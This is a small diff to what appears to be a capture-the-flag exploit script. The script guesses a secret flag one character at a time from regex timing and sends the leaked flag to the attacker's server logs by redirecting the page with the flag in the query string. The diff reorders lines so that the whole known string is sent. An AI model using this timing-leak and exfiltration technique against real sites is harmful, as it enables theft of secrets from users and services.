@@ -45,10 +45,10 @@ async function measure(start, c) {
 
   // This took longer than usual, indicating regex-bullshittery
   if (time > threshold) {
-    // Add the current flag to the url so we can see it in our server logs
-    window.location = window.location.origin + window.location.pathname + "?" + known + c;
     // Update the "known" variable with the new character
     known = known + c;
+    // Add the current flag to the url so we can see it in our server logs
+    window.location = window.location.origin + window.location.pathname + "?" + known;
   }
 }
 
